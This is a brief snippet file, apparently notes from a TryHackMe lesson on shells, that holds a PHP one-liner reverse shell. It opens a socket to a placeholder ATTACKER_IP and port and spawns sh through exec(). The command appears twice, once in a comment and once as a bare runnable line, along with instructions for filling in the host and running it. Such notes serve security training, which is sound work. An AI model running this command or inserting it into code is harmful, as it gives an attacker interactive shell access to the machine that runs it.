# PHP Reverse Shell - exec()
# Source: TryHackMe - Shells Overview, Task 6
# Usage: replace ATTACKER_IP and PORT, run with: php -r '<command>'
#
#   php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("sh <&3 >&3 2>&3");'
#
# Creates a socket to attacker IP:PORT and uses exec() to spawn a shell.

php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("sh <&3 >&3 2>&3");'
